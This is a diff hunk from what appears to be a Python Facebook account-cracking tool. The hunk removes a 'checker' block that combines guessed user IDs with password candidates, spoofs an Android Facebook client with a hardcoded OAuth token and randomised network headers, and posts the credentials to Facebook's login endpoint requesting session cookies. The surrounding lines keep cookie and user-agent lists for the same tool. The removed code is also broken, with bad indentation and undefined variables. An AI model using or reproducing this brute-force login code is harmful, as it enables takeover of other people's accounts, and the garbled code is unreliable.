@@ -73,54 +73,6 @@ ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
-#-------checker------#
-import os, uuid, random
-import requests as r
-
-def login():
-    os.system("clear")
-    print("\033[1;37m")
-            uid = kode+guru
-			pwx = [guru,kode+guru]
-    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
-    check(uid, pww, ua)
-
-def check(uid, pww, ua):
-    try:
-        data = {
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "email": uid,
-            "password": pww,
-            "cpl": "true",
-            "source": "device_based_login",
-            "format": "json",
-            "generate_session_cookies": "1",
-            "generate_analytic_claims": "1",
-            "generate_machine_id": "1",
-            "locale": "GB",
-            "country_code": "GB",
-            "client_country_code": "GB",
-            "currently_logged_in_userid": "0",
-        }
-        headers = {
-            "User-Agent": ua, 
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Connection-Quality": "EXCELLENT",
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-HTTP-Engine": "Liger",
-        }
-        url = "https://b-graph.facebook.com/auth/login"
-        result = r.post(url, data=data, headers=headers).json()
-        print(result)
-    except:
-        pass
-
-login()
-
 
 logo = ("""
 \033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
